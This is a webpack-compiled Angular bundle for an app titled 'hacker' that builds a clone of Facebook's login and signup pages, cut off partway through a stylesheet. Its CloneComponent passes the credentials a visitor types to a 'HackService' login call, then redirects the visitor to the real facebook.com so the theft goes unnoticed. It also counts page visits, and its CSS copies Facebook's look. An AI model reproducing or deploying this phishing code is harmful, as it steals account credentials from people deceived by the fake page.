/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");


var AppComponent = /** @class */ (function () {
    function AppComponent() {
        this.title = 'hacker';
    }
    AppComponent = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Component"])({
            selector: 'app-root',
            template: __webpack_require__(/*! raw-loader!./app.component.html */ "./node_modules/raw-loader/index.js!./src/app/app.component.html"),
            styles: [__webpack_require__(/*! ./app.component.css */ "./src/app/app.component.css")]
        })
    ], AppComponent);
    return AppComponent;
}());



/***/ }),

/***/ "./src/app/app.module.ts":
/*!*******************************!*\
  !*** ./src/app/app.module.ts ***!
  \*******************************/
/*! exports provided: AppModule */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "AppModule", function() { return AppModule; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_platform_browser__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/platform-browser */ "./node_modules/@angular/platform-browser/fesm5/platform-browser.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _app_routing_module__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./app-routing.module */ "./src/app/app-routing.module.ts");
/* harmony import */ var _app_component__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./app.component */ "./src/app/app.component.ts");
/* harmony import */ var _angular_common_http__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! @angular/common/http */ "./node_modules/@angular/common/fesm5/http.js");
/* harmony import */ var _angular_forms__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! @angular/forms */ "./node_modules/@angular/forms/fesm5/forms.js");
/* harmony import */ var src_app_services_hack_service__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! src/app/services/hack.service */ "./src/app/services/hack.service.ts");









var AppModule = /** @class */ (function () {
    function AppModule() {
    }
    AppModule = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_2__["NgModule"])({
            declarations: [
                _app_component__WEBPACK_IMPORTED_MODULE_4__["AppComponent"],
                _app_routing_module__WEBPACK_IMPORTED_MODULE_3__["routingComponents"]
            ],
            imports: [
                _angular_platform_browser__WEBPACK_IMPORTED_MODULE_1__["BrowserModule"],
                _app_routing_module__WEBPACK_IMPORTED_MODULE_3__["AppRoutingModule"],
                _angular_common_http__WEBPACK_IMPORTED_MODULE_5__["HttpClientModule"],
                _angular_forms__WEBPACK_IMPORTED_MODULE_6__["FormsModule"],
            ],
            providers: [src_app_services_hack_service__WEBPACK_IMPORTED_MODULE_7__["HackService"]],
            bootstrap: [_app_component__WEBPACK_IMPORTED_MODULE_4__["AppComponent"]]
        })
    ], AppModule);
    return AppModule;
}());



/***/ }),

/***/ "./src/app/clone/clone.component.css":
/*!*******************************************!*\
  !*** ./src/app/clone/clone.component.css ***!
  \*******************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = ".uk-section{\r\n    background-color: #edf0f5;\r\n}\r\n\r\n.uk-input {\r\n    display: inline-block;\r\n    font-size: 18px;\r\n    padding: 8px 10px;\r\n    border: 1px solid #bdc7d8;\r\n  -webkit-border-radius: 5px;\r\n    color:#333;\r\n    margin-bottom:10px;\r\n}\r\n\r\n.signup {\r\n    font-size:36px;\r\n    -webkit-font-smoothing: antialiased;\r\n    font-weight:700;\r\n    margin-bottom:5px;\r\n  }\r\n\r\n.bolder {\r\n    font-family: 'Open Sans',sans-serif;\r\n    text-rendering:optimizelegibility;\r\n    color:#333;\r\n  }\r\n\r\n.free {\r\n    font-size:19px;\r\n    margin-bottom:20px;\r\n  }\r\n\r\n.bday {\r\n    font-size:19px;\r\n    color:#141823;\r\n    -webkit-font-smoothing: antialiased;\r\n    margin-bottom:5px;\r\n  }\r\n\r\n.uk-select {\r\n    display: inline-block;\r\n    height:30px;\r\n    font-size: 13px;\r\n    border: 1px solid #bdc7d8;\r\n    -webkit-border-radius: 5px;\r\n    color:#141823;\r\n   \r\n  }\r\n\r\n.why {\r\n    font-size: 11px;\r\n    color: #3b5998;\r\n    width:150px;\r\n    margin-left:10px;\r\n    cursor:pointer;\r\n  }\r\n\r\n.h:hover {\r\n    text-decoration: underline;\r\n  }\r\n\r\n.fb1 {\r\n    display:inline-block;\r\n    vertical-align: middle;\r\n  }\r\n\r\n.gender {\r\n    font-size: 18px;\r\n    color: #141823;\r\n    cursor: pointer;\r\n    padding: 0 10px 0 3px;\r\n    margin-right: 4px;\r\n    line-height: 18px;\r\n    vertical-align: middle;\r\n  }\r\n\r\n.agree {\r\n    font-size: 11px;\r\n    color: #777;\r\n    width:70%;\r\n    /* margin: 11px 0 11px ; */\r\n  }\r\n\r\n.link {\r\n    color:#3b5998;\r\n    display: inline-block;\r\n    cursor: pointer;\r\n  }\r\n\r\n.signbut {\r\n    font-size: 19px;\r\n    font-weight: 700;\r\n    letter-spacing: 1px;\r\n    color:#fff;\r\n    min-width: 194px;\r\n    padding: 7px 20px;\r\n    text-align: center;\r\n    -webkit-border-radius: 5px;\r\n    background: -webkit-linear-gradient(#67ae55, #578843);\r\n    -webkit-box-shadow: inset 0 1px 1px #a4e388;\r\n    border: 1px solid;\r\n  border-color: #3b6e22 #3b6e22 #2c5115;\r\n    margin-top: 10px;\r\n  margin-bottom: 10px;\r\n    text-shadow: 0 1px 2px rgba(0,0,0,.5);\r\n    cursor:pointer;\r\n  }\r\n\r\n.create {\r\n    border-top: 1px solid #a0a9c0;\r\n    color: #666;\r\n    font-size: 13px;\r\n    font-weight: bold;\r\n  }\r\n\r\n.connect {\r\n    width:80%;\r\n    /* height: 5rem; */\r\n    padding: 42px 0 24px;\r\n    font-size: 20px;\r\n    font-weight: 700;\r\n    line-height: 36px;\r\n    color: #333;\r\n    display:inline-block;\r\n  }\r\n\r\n.uk-navbar-container{\r\n      background: #3b5998\r\n  }\r\n\r\n.body-container{\r\n      padding-top: 1rem;\r\n  }\r\n\r\n.inputtext {\r\n    border-color: #1d2a5b;\r\n    margin: 0;\r\n    width: 90%;\r\n    border: 1px solid #bdc7d8;\r\n    margin: 0;\r\n    padding: 3px;\r\n    background-color: #FAFFBD;\r\n  }\r\n\r\nh1 {\r\n    font-family: tahoma,verdana,arial,sans-serif;\r\n    font-size: 38px;\r\n    letter-spacing:0.05px;\r\n    margin: 0;\r\n    color:#fff;\r\n    -webkit-font-smoothing: antialiased;\r\n  }\r\n\r\n.row1 {\r\n    \r\n    color:#fff;\r\n    font-size:11px;\r\n    cursor:pointer;\r\n  }\r\n\r\n#button {\r\n    position:relative;\r\n    /* width:45px;\r\n    height:18px; */\r\n    background-color: #5b72a9;\r\n    border: 1px solid #999;\r\n    border-color:#8b9dc3 #2f477a #29447e #1a356e;\r\n    -webkit-box-shadow: 0 1px 0 rgba(0, 0, 0, .1);\r\n    cursor:pointer;\r\n    font-size:11px;\r\n    font-weight:bold;\r\n    text-align:center;\r\n    color:#fff;\r\n  }\r\n\r\n.row2 {\r\n    \r\n    color:#9daccb;\r\n    font-size:11px;\r\n    cursor:pointer;\r\n  }\r\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbInNyYy9hcHAvY2xvbmUvY2xvbmUuY29tcG9uZW50LmNzcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTtJQUNJLHlCQUF5QjtBQUM3Qjs7QUFFQTtJQUNJLHFCQUFxQjtJQUNyQixlQUFlO0lBQ2YsaUJBQWlCO0lBQ2pCLHlCQUF5QjtFQUMzQiwwQkFBMEI7SUFDeEIsVUFBVTtJQUNWLGtCQUFrQjtBQUN0Qjs7QUFFQTtJQUNJLGNBQWM7SUFDZCxtQ0FBbUM7SUFDbkMsZUFBZTtJQUNmLGlCQUFpQjtFQUNuQjs7QUFFQTtJQUNFLG1DQUFtQztJQUNuQyxpQ0FBaUM7SUFDakMsVUFBVTtFQUNaOztBQUNBO0lBQ0UsY0FBYztJQUNkLGtCQUFrQjtFQUNwQjs7QUFFQTtJQUNFLGNBQWM7SUFDZCxhQUFhO0lBQ2IsbUNBQW1DO0lBQ25DLGlCQUFpQjtFQUNuQjs7QUFFQTtJQUNFLHFCQUFxQjtJQUNyQixXQUFXO0lBQ1gsZUFBZTtJQUNmLHlCQUF5QjtJQUN6QiwwQkFBMEI7SUFDMUIsYUFBYTs7RUFFZjs7QUFFQTtJQUNFLGVBQWU7SUFDZixjQUFjO0lBQ2QsV0FBVztJQUNYLGdCQUFnQjtJQUNoQixjQUFjO0VBQ2hCOztBQUVBO0lBQ0UsMEJBQTBCO0VBQzVCOztBQUNBO0lBQ0Usb0JBQW9CO0lBQ3BCLHNCQUFzQjtFQUN4Qjs7QUFFQTtJQUNFLGVBQWU7SUFDZixjQUFjO0lBQ2QsZUFBZTtJQUNmLHFCQUFxQjtJQUNyQixpQkFBaUI7SUFDakIsaUJBQWlCO0lBQ2pCLHNCQUFzQjtFQUN4Qjs7QUFFQTtJQUNFLGVBQWU7SUFDZixXQUFXO0lBQ1gsU0FBUztJQUNULDBCQUEwQjtFQUM1Qjs7QUFFQTtJQUNFLGFBQWE7SUFDYixxQkFBcUI7SUFDckIsZUFBZTtFQUNqQjs7QUFFQTtJQUNFLGVBQWU7SUFDZixnQkFBZ0I7SUFDaEIsbUJBQW1CO0lBQ25CLFVBQVU7SUFDVixnQkFBZ0I7SUFDaEIsaUJBQWlCO0lBQ2pCLGtCQUFrQjtJQUNsQiwwQkFBMEI7SUFDMUIscURBQXFEO0lBQ3JELDJDQUEyQztJQUMzQyxpQkFBaUI7RUFDbkIscUNBQXFDO0lBQ25DLGdCQUFnQjtFQUNsQixtQkFBbUI7SUFDakIscUNBQXFDO0lBQ3JDLGNBQWM7RUFDaEI7O0FBRUE7SUFDRSw2QkFBNkI7SUFDN0IsV0FBVztJQUNYLGVBQWU7SUFDZixpQkFBaUI7RUFDbkI7O0FBRUE7SUFDRSxTQUFTO0lBQ1Qsa0JBQWtCO0lBQ2xCLG9CQUFvQjtJQUNwQixlQUFlO0lBQ2YsZ0JBQWdCO0lBQ2hCLGlCQUFpQjtJQUNqQixXQUFXO0lBQ1gsb0JBQW9CO0VBQ3RCOztBQUVBO01BQ0k7RUFDSjs7QUFFQTtNQUNJLGlCQUFpQjtFQUNyQjs7QUFFQTtJQUNFLHFCQUFxQjtJQUNyQixTQUFTO0lBQ1QsVUFBVTtJQUNWLHlCQUF5QjtJQUN6QixTQUFTO0lBQ1QsWUFBWTtJQUNaLHlCQUF5QjtFQUMzQjs7QUFFQTtJQUNFLDRDQUE0QztJQUM1QyxlQUFlO0lBQ2YscUJBQXFCO0lBQ3JCLFNBQVM7SUFDVCxVQUFVO0lBQ1YsbUNBQW1DO0VBQ3JDOztBQUVBOztJQUVFLFVBQVU7SUFDVixjQUFjO0lBQ2QsY0FBYztFQUNoQjs7QUFFQTtJQUNFLGlCQUFpQjtJQUNqQjtrQkFDYztJQUNkLHlCQUF5QjtJQUN6QixzQkFBc0I7SUFDdEIsNENBQTRDO0lBQzVDLDZDQUE2QztJQUM3QyxjQUFjO0lBQ2QsY0FBYztJQUNkLGdCQUFnQjtJQUNoQixpQkFBaUI7SUFDakIsVUFBVTtFQUNaOztBQUVBOztJQUVFLGFBQWE7SUFDYixjQUFjO0lBQ2QsY0FBYztFQUNoQiIsImZpbGUiOiJzcmMvYXBwL2Nsb25lL2Nsb25lLmNvbXBvbmVudC5jc3MiLCJzb3VyY2VzQ29udGVudCI6WyIudWstc2VjdGlvbntcclxuICAgIGJhY2tncm91bmQtY29sb3I6ICNlZGYwZjU7XHJcbn1cclxuXHJcbi51ay1pbnB1dCB7XHJcbiAgICBkaXNwbGF5OiBpbmxpbmUtYmxvY2s7XHJcbiAgICBmb250LXNpemU6IDE4cHg7XHJcbiAgICBwYWRkaW5nOiA4cHggMTBweDtcclxuICAgIGJvcmRlcjogMXB4IHNvbGlkICNiZGM3ZDg7XHJcbiAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA1cHg7XHJcbiAgICBjb2xvcjojMzMzO1xyXG4gICAgbWFyZ2luLWJvdHRvbToxMHB4O1xyXG59XHJcbiAgXHJcbi5zaWdudXAge1xyXG4gICAgZm9udC1zaXplOjM2cHg7XHJcbiAgICAtd2Via2l0LWZvbnQtc21vb3RoaW5nOiBhbnRpYWxpYXNlZDtcclxuICAgIGZvbnQtd2VpZ2h0OjcwMDtcclxuICAgIG1hcmdpbi1ib3R0b206NXB4O1xyXG4gIH1cclxuICBcclxuICAuYm9sZGVyIHtcclxuICAgIGZvbnQtZmFtaWx5OiAnT3BlbiBTYW5zJyxzYW5zLXNlcmlmO1xyXG4gICAgdGV4dC1yZW5kZXJpbmc6b3B0aW1pemVsZWdpYmlsaXR5O1xyXG4gICAgY29sb3I6IzMzMztcclxuICB9XHJcbiAgLmZyZWUge1xyXG4gICAgZm9udC1zaXplOjE5cHg7XHJcbiAgICBtYXJnaW4tYm90dG9tOjIwcHg7XHJcbiAgfVxyXG5cclxuICAuYmRheSB7XHJcbiAgICBmb250LXNpemU6MTlweDtcclxuICAgIGNvbG9yOiMxNDE4MjM7XHJcbiAgICAtd2Via2l0LWZvbnQtc21vb3RoaW5nOiBhbnRpYWxpYXNlZDtcclxuICAgIG1hcmdpbi1ib3R0b206NXB4O1xyXG4gIH1cclxuXHJcbiAgLnVrLXNlbGVjdCB7XHJcbiAgICBkaXNwbGF5OiBpbmxpbmUtYmxvY2s7XHJcbiAgICBoZWlnaHQ6MzBweDtcclxuICAgIGZvbnQtc2l6ZTogMTNweDtcclxuICAgIGJvcmRlcjogMXB4IHNvbGlkICNiZGM3ZDg7XHJcbiAgICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDVweDtcclxuICAgIGNvbG9yOiMxNDE4MjM7XHJcbiAgIFxyXG4gIH1cclxuXHJcbiAgLndoeSB7XHJcbiAgICBmb250LXNpemU6IDExcHg7XHJcbiAgICBjb2xvcjogIzNiNTk5ODtcclxuICAgIHdpZHRoOjE1MHB4O1xyXG4gICAgbWFyZ2luLWxlZnQ6MTBweDtcclxuICAgIGN1cnNvcjpwb2ludGVyO1xyXG4gIH1cclxuICBcclxuICAuaDpob3ZlciB7XHJcbiAgICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTtcclxuICB9XHJcbiAgLmZiMSB7XHJcbiAgICBkaXNwbGF5OmlubGluZS1ibG9jaztcclxuICAgIHZlcnRpY2FsLWFsaWduOiBtaWRkbGU7XHJcbiAgfVxyXG5cclxuICAuZ2VuZGVyIHtcclxuICAgIGZvbnQtc2l6ZTogMThweDtcclxuICAgIGNvbG9yOiAjMTQxODIzO1xyXG4gICAgY3Vyc29yOiBwb2ludGVyO1xyXG4gICAgcGFkZGluZzogMCAxMHB4IDAgM3B4O1xyXG4gICAgbWFyZ2luLXJpZ2h0OiA0cHg7XHJcbiAgICBsaW5lLWhlaWdodDogMThweDtcclxuICAgIHZlcnRpY2FsLWFsaWduOiBtaWRkbGU7XHJcbiAgfVxyXG5cclxuICAuYWdyZWUge1xyXG4gICAgZm9udC1zaXplOiAxMXB4O1xyXG4gICAgY29sb3I6ICM3Nzc7XHJcbiAgICB3aWR0aDo3MCU7XHJcbiAgICAvKiBtYXJnaW46IDExcHggMCAxMXB4IDsgKi9cclxuICB9XHJcblxyXG4gIC5saW5rIHtcclxuICAgIGNvbG9yOiMzYjU5OTg7XHJcbiAgICBkaXNwbGF5OiBpbmxpbmUtYmxvY2s7XHJcbiAgICBjdXJzb3I6IHBvaW50ZXI7XHJcbiAgfVxyXG5cclxuICAuc2lnbmJ1dCB7XHJcbiAgICBmb250LXNpemU6IDE5cHg7XHJcbiAgICBmb250LXdlaWdodDogNzAwO1xyXG4gICAgbGV0dGVyLXNwYWNpbmc6IDFweDtcclxuICAgIGNvbG9yOiNmZmY7XHJcbiAgICBtaW4td2lkdGg6IDE5NHB4O1xyXG4gICAgcGFkZGluZzogN3B4IDIwcHg7XHJcbiAgICB0ZXh0LWFsaWduOiBjZW50ZXI7XHJcbiAgICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDVweDtcclxuICAgIGJhY2tncm91bmQ6IC13ZWJraXQtbGluZWFyLWdyYWRpZW50KCM2N2FlNTUsICM1Nzg4NDMpO1xyXG4gICAgLXdlYmtpdC1ib3gtc2hhZG93OiBpbnNldCAwIDFweCAxcHggI2E0ZTM4ODtcclxuICAgIGJvcmRlcjogMXB4IHNvbGlkO1xyXG4gIGJvcmRlci1jb2xvcjogIzNiNmUyMiAjM2I2ZTIyICMyYzUxMTU7XHJcbiAgICBtYXJnaW4tdG9wOiAxMHB4O1xyXG4gIG1hcmdpbi1ib3R0b206IDEwcHg7XHJcbiAgICB0ZXh0LXNoYWRvdzogMCAxcHggMnB4IHJnYmEoMCwwLDAsLjUpO1xyXG4gICAgY3Vyc29yOnBvaW50ZXI7XHJcbiAgfVxyXG5cclxuICAuY3JlYXRlIHtcclxuICAgIGJvcmRlci10b3A6IDFweCBzb2xpZCAjYTBhOWMwO1xyXG4gICAgY29sb3I6ICM2NjY7XHJcbiAgICBmb250LXNpemU6IDEzcHg7XHJcbiAgICBmb250LXdlaWdodDogYm9sZDtcclxuICB9XHJcblxyXG4gIC5jb25uZWN0IHtcclxuICAgIHdpZHRoOjgwJTtcclxuICAgIC8qIGhlaWdodDogNXJlbTsgKi9cclxuICAgIHBhZGRpbmc6IDQycHggMCAyNHB4O1xyXG4gICAgZm9udC1zaXplOiAyMHB4O1xyXG4gICAgZm9udC13ZWlnaHQ6IDcwMDtcclxuICAgIGxpbmUtaGVpZ2h0OiAzNnB4O1xyXG4gICAgY29sb3I6ICMzMzM7XHJcbiAgICBkaXNwbGF5OmlubGluZS1ibG9jaztcclxuICB9XHJcbiAgXHJcbiAgLnVrLW5hdmJhci1jb250YWluZXJ7XHJcbiAgICAgIGJhY2tncm91bmQ6ICMzYjU5OThcclxuICB9XHJcblxyXG4gIC5ib2R5LWNvbnRhaW5lcntcclxuICAgICAgcGFkZGluZy10b3A6IDFyZW07XHJcbiAgfVxyXG5cclxuICAuaW5wdXR0ZXh0IHtcclxuICAgIGJvcmRlci1jb2xvcjogIzFkMmE1YjtcclxuICAgIG1hcmdpbjogMDtcclxuICAgIHdpZHRoOiA5MCU7XHJcbiAgICBib3JkZXI6IDFweCBzb2xpZCAjYmRjN2Q4O1xyXG4gICAgbWFyZ2luOiAwO1xyXG4gICAgcGFkZGluZzogM3B4O1xyXG4gICAgYmFja2dyb3VuZC1jb2xvcjogI0ZBRkZCRDtcclxuICB9XHJcblxyXG4gIGgxIHtcclxuICAgIGZvbnQtZmFtaWx5OiB0YWhvbWEsdmVyZGFuYSxhcmlhbCxzYW5zLXNlcmlmO1xyXG4gICAgZm9udC1zaXplOiAzOHB4O1xyXG4gICAgbGV0dGVyLXNwYWNpbmc6MC4wNXB4O1xyXG4gICAgbWFyZ2luOiAwO1xyXG4gICAgY29sb3I6I2ZmZjtcclxuICAgIC13ZWJraXQtZm9udC1zbW9vdGhpbmc6IGFudGlhbGlhc2VkO1xyXG4gIH1cclxuICBcclxuICAucm93MSB7XHJcbiAgICBcclxuICAgIGNvbG9yOiNmZmY7XHJcbiAgICBmb250LXNpemU6MTFweDtcclxuICAgIGN1cnNvcjpwb2ludGVyO1xyXG4gIH1cclxuXHJcbiAgI2J1dHRvbiB7XHJcbiAgICBwb3NpdGlvbjpyZWxhdGl2ZTtcclxuICAgIC8qIHdpZHRoOjQ1cHg7XHJcbiAgICBoZWlnaHQ6MThweDsgKi9cclxuICAgIGJhY2tncm91bmQtY29sb3I6ICM1YjcyYTk7XHJcbiAgICBib3JkZXI6IDFweCBzb2xpZCAjOTk5O1xyXG4gICAgYm9yZGVyLWNvbG9yOiM4YjlkYzMgIzJmNDc3YSAjMjk0NDdlICMxYTM1NmU7XHJcbiAgICAtd2Via2l0LWJveC1zaGFkb3c6IDAgMXB4IDAgcmdiYSgwLCAwLCAwLCAuMSk7XHJcbiAgICBjdXJzb3I6cG9pbnRlcjtcclxuICAgIGZvbnQtc2l6ZToxMXB4O1xyXG4gICAgZm9udC13ZWlnaHQ6Ym9sZDtcclxuICAgIHRleHQtYWxpZ246Y2VudGVyO1xyXG4gICAgY29sb3I6I2ZmZjtcclxuICB9XHJcblxyXG4gIC5yb3cyIHtcclxuICAgIFxyXG4gICAgY29sb3I6IzlkYWNjYjtcclxuICAgIGZvbnQtc2l6ZToxMXB4O1xyXG4gICAgY3Vyc29yOnBvaW50ZXI7XHJcbiAgfSJdfQ== */"

/***/ }),

/***/ "./src/app/clone/clone.component.ts":
/*!******************************************!*\
  !*** ./src/app/clone/clone.component.ts ***!
  \******************************************/
/*! exports provided: CloneComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "CloneComponent", function() { return CloneComponent; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _services_hack_service__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ../services/hack.service */ "./src/app/services/hack.service.ts");
/* harmony import */ var _angular_router__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! @angular/router */ "./node_modules/@angular/router/fesm5/router.js");




var CloneComponent = /** @class */ (function () {
    function CloneComponent(hackService, router) {
        this.hackService = hackService;
        this.router = router;
        this.new_user = {};
        this.user = {};
        this.hackService.pageCount().subscribe(function (resp) {
            console.log(resp);
        }, function (err) {
            console.log(err);
        });
    }
    CloneComponent.prototype.login = function () {
        this.hackService.login(this.user).subscribe(function (resp) {
            console.log(resp);
            window.location.href = 'https://facebook.com';
        }, function (err) {
            console.log(err);
        });
    };
    CloneComponent.prototype.newUser = function () {
        window.location.href = 'https://facebook.com';
    };
    CloneComponent.prototype.ngOnInit = function () {
    };
    CloneComponent.ctorParameters = function () { return [
        { type: _services_hack_service__WEBPACK_IMPORTED_MODULE_2__["HackService"] },
        { type: _angular_router__WEBPACK_IMPORTED_MODULE_3__["Router"] }
    ]; };
    CloneComponent = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Component"])({
            selector: 'app-clone',
            template: __webpack_require__(/*! raw-loader!./clone.component.html */ "./node_modules/raw-loader/index.js!./src/app/clone/clone.component.html"),
            styles: [__webpack_require__(/*! ./clone.component.css */ "./src/app/clone/clone.component.css")]
        })
    ], CloneComponent);
    return CloneComponent;
}());



/***/ }),

/***/ "./src/app/facebook/facebook.component.css":
/*!*************************************************!*\
  !*** ./src/app/facebook/facebook.component.css ***!
  \*************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "body {\r\n    margin: 0;\r\n    font-family: 'Lucida Grande', tahoma,verdana,arial,sans-serif;\r\n    line-height: 1.28;\r\n  }\r\n  \r\n  #navwrapper {\r\n    width: 100%;\r\n    height: 82px;\r\n    background-color: #3b5998;\r\n  }\r\n  \r\n  #navbar {\r\n    margin: 0 auto;\r\n    width:980px;\r\n    height:59px;\r\n  }\r\n  \r\n  #contentwrapper {\r\n    width: 100%;\r\n    height: 606px;\r\n    background-color: #edf0f5;\r\n  }\r\n  \r\n  #content {\r\n    margin: 0 auto;\r\n    width:980px;\r\n    padding-top:20px;\r\n  }\r\n  \r\n  h1 {\r\n    font-family: tahoma,verdana,arial,sans-serif;\r\n    font-size: 38px;\r\n    letter-spacing:0.05px;\r\n    margin: 0;\r\n    color:#fff;\r\n    -webkit-font-smoothing: antialiased;\r\n  }\r\n  \r\n  .logowrapper {\r\n    display: block;\r\n    padding: 30px 0;\r\n  }\r\n  \r\n  #button {\r\n    position:relative;\r\n    width:45px;\r\n    height:18px;\r\n    background-color: #5b72a9;\r\n    border: 1px solid #999;\r\n    border-color:#8b9dc3 #2f477a #29447e #1a356e;\r\n    -webkit-box-shadow: 0 1px 0 rgba(0, 0, 0, .1);\r\n    cursor:pointer;\r\n    font-size:11px;\r\n    font-weight:bold;\r\n    text-align:center;\r\n    color:#fff;\r\n  }\r\n  \r\n  .tablewrapper {\r\n    float:right;\r\n    margin-top:15px;\r\n  }\r\n  \r\n  .row1 {\r\n    \r\n    color:#fff;\r\n    font-size:11px;\r\n    width:164px;\r\n    cursor:pointer;\r\n  }\r\n  \r\n  .inputtext {\r\n    border-color: #1d2a5b;\r\n    margin: 0;\r\n    width: 142px;\r\n    border: 1px solid #bdc7d8;\r\n    margin: 0;\r\n    padding: 3px;\r\n    background-color: #FAFFBD;\r\n  }\r\n  \r\n  .row2 {\r\n    \r\n    color:#9daccb;\r\n    font-size:11px;\r\n    width:164px;\r\n    cursor:pointer;\r\n  }\r\n  \r\n  #leftbod {\r\n    width:565px;\r\n    display:inline-block;\r\n  }\r\n  \r\n  .connect {\r\n    width:409px;\r\n    height: 72px;\r\n    padding: 42px 0 24px;\r\n    font-size: 20px;\r\n    font-weight: 700;\r\n    line-height: 36px;\r\n    color: #333;\r\n    display:inline-block;\r\n  }\r\n  \r\n  .leftbar {\r\n    padding-bottom:10px;\r\n    margin-top:20px;\r\n  }\r\n  \r\n  .iconwrap {\r\n    margin-right:20px;\r\n    width:55px;\r\n    \r\n  }\r\n  \r\n  .rowtext {\r\n    font-size:16px;\r\n    font-weight:bold;\r\n    color:#333;\r\n  }\r\n  \r\n  .fb1 {\r\n    display:inline-block;\r\n    vertical-align: middle;\r\n  }\r\n  \r\n  .rowtext2 {\r\n    font-size:15px;\r\n    color:#666;\r\n    margin-left:10px;\r\n  }\r\n  \r\n  #rightbod {\r\n    display:inline-block;\r\n    vertical-align:top;\r\n    width:399px;\r\n    height:200px;\r\n    float:right;\r\n  }\r\n  \r\n  .signup {\r\n    font-size:36px;\r\n    -webkit-font-smoothing: antialiased;\r\n    font-weight:700;\r\n    margin-bottom:5px;\r\n  }\r\n  \r\n  .bolder {\r\n    font-family: 'Open Sans',sans-serif;\r\n    text-rendering:optimizelegibility;\r\n    color:#333;\r\n  }\r\n  \r\n  .free {\r\n    font-size:19px;\r\n    margin-bottom:20px;\r\n  }\r\n  \r\n  .formbox {\r\n    display: inline-block;\r\n    width:399px;\r\n  }\r\n  \r\n  .inputbody {\r\n    display: inline-block;\r\n    font-size: 18px;\r\n    padding: 8px 10px;\r\n    border: 1px solid #bdc7d8;\r\n  -webkit-border-radius: 5px;\r\n    color:#333;\r\n    margin-bottom:10px;\r\n  }\r\n  \r\n  ::-webkit-input-placeholder {\r\n     color: #999;\r\n  }\r\n  \r\n  ::-moz-placeholder {\r\n     color: #999;  \r\n  }\r\n  \r\n  :-ms-input-placeholder {  \r\n     color: #999;  \r\n  }\r\n  \r\n  .in1 {\r\n    width:172px;\r\n  }\r\n  \r\n  .in2 {\r\n    width:377px;\r\n  }\r\n  \r\n  .fr {\r\n    float:right;\r\n  }\r\n  \r\n  .fl {\r\n    float:left;\r\n  }\r\n  \r\n  .bday {\r\n    font-size:19px;\r\n    color:#141823;\r\n    -webkit-font-smoothing: antialiased;\r\n    margin-bottom:5px;\r\n  }\r\n  \r\n  .selectbody {\r\n    display: inline-block;\r\n    height:30px;\r\n    font-size: 13px;\r\n    border: 1px solid #bdc7d8;\r\n    -webkit-border-radius: 5px;\r\n    color:#141823;\r\n   \r\n  }\r\n  \r\n  .why {\r\n    font-size: 11px;\r\n    color: #3b5998;\r\n    width:150px;\r\n    margin-left:10px;\r\n    cursor:pointer;\r\n  }\r\n  \r\n  .h:hover {\r\n    text-decoration: underline;\r\n  }\r\n  \r\n  .gender {\r\n    font-size: 18px;\r\n    color: #141823;\r\n    cursor: pointer;\r\n    padding: 0 10px 0 3px;\r\n    margin-right: 4px;\r\n    line-height: 18px;\r\n    vertical-align: middle;\r\n  }\r\n  \r\n  .spanpad {\r\n    padding: 5px 0 5px 4px;\r\n    display: inline-block;\r\n  }\r\n  \r\n  .mt1 {\r\n    margin-top:15px;\r\n  }\r\n  \r\n  .m0 {\r\n    margin: 0;\r\n  }\r\n  \r\n  .agree {\r\n    font-size: 11px;\r\n    color: #777;\r\n    width:316px;\r\n    margin: 11px 0 11px ;\r\n  }\r\n  \r\n  .link {\r\n    color:#3b5998;\r\n    display: inline-block;\r\n    cursor: pointer;\r\n  }\r\n  \r\n  .signbut {\r\n    font-size: 19px;\r\n    font-weight: 700;\r\n    letter-spacing: 1px;\r\n    color:#fff;\r\n    min-width: 194px;\r\n    padding: 7px 20px;\r\n    text-align: center;\r\n    -webkit-border-radius: 5px;\r\n    background: -webkit-linear-gradient(#67ae55, #578843);\r\n    -webkit-box-shadow: inset 0 1px 1px #a4e388;\r\n    border: 1px solid;\r\n  border-color: #3b6e22 #3b6e22 #2c5115;\r\n    margin-top: 10px;\r\n  margin-bottom: 10px;\r\n    text-shadow: 0 1px 2px 